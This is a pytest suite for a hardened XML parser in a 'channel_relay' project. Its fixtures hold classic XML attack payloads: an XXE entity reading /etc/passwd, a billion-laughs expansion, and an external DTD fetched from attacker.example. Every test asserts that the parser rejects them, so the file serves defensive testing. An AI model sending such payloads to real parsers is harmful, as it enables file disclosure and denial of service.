"""Attack and limit tests for the hardened XML parser factory (T2.3, §9.4)."""

from __future__ import annotations

from pathlib import Path

import pytest

from channel_relay.pii.xml_ops import (
    XmlOversizeError,
    XmlParseError,
    XmlStructureError,
    parse_bytes,
    serialize,
)

XXE_FILE_READ = b"""<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"""

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://attacker.example/evil.dtd">
<root>x</root>"""

PLAIN_DOCTYPE = b"""<!DOCTYPE root><root>x</root>"""


def test_xxe_file_read_rejected() -> None:
    with pytest.raises(XmlStructureError) as excinfo:
        parse_bytes(XXE_FILE_READ)
    assert excinfo.value.kind == "doctype"


def test_billion_laughs_rejected() -> None:
    with pytest.raises(XmlStructureError):
        parse_bytes(BILLION_LAUGHS)


def test_external_dtd_rejected() -> None:
    with pytest.raises(XmlStructureError):
        parse_bytes(EXTERNAL_DTD)


def test_plain_doctype_rejected() -> None:
    with pytest.raises(XmlStructureError):
        parse_bytes(PLAIN_DOCTYPE)


def test_no_file_access_on_xxe(tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("s3cret")
    doc = (
        b'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file://'
        + str(secret).encode()
        + b'">]><root>&xxe;</root>'
    )
    with pytest.raises(XmlStructureError):
        parse_bytes(doc)


def test_oversize_rejected() -> None:
    body = b"<root>" + b"a" * 100 + b"</root>"
    with pytest.raises(XmlOversizeError):
        parse_bytes(body, max_bytes=50)


def test_excessive_depth_rejected() -> None:
    depth = 60
    body = b"".join(b"<e%d>" % i for i in range(depth))
    body += b"x"
    body += b"".join(b"</e%d>" % i for i in reversed(range(depth)))
    with pytest.raises(XmlStructureError) as excinfo:
        parse_bytes(body, max_depth=50)
    assert excinfo.value.kind == "depth"


def test_excessive_node_count_rejected() -> None:
    body = b"<root>" + b"<e/>" * 100 + b"</root>"
    with pytest.raises(XmlStructureError) as excinfo:
        parse_bytes(body, max_nodes=50)
    assert excinfo.value.kind == "nodes"


def test_malformed_xml_raises_parse_error() -> None:
    with pytest.raises(XmlParseError):
        parse_bytes(b"<root><unclosed></root>")


def test_empty_body_raises_parse_error() -> None:
    with pytest.raises(XmlParseError):
        parse_bytes(b"")


def test_valid_document_parses() -> None:
    root = parse_bytes(b'<a xmlns:n="urn:x"><n:b attr="1">text</n:b></a>')
    assert root.tag == "a"


def test_serialize_round_trip_preserves_namespaces() -> None:
    original = (
        b'<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="urn:soap">'
        b'<s:Body><Op xmlns="urn:op">v</Op></s:Body></s:Envelope>'
    )
    root = parse_bytes(original)
    output = serialize(root)
    reparsed = parse_bytes(output)
    assert reparsed.tag == "{urn:soap}Envelope"
    body = reparsed[0]
    assert body.tag == "{urn:soap}Body"
    assert body[0].tag == "{urn:op}Op"
    assert body[0].text == "v"


def test_error_kinds_are_stable() -> None:
    # kinds feed the channel_relay_xml_parse_errors_total{kind} metric label set.
    with pytest.raises(XmlParseError) as parse_exc:
        parse_bytes(b"not xml at all")
    assert parse_exc.value.kind == "malformed"
    with pytest.raises(XmlOversizeError) as size_exc:
        parse_bytes(b"<a></a>", max_bytes=3)
    assert size_exc.value.kind == "oversize"
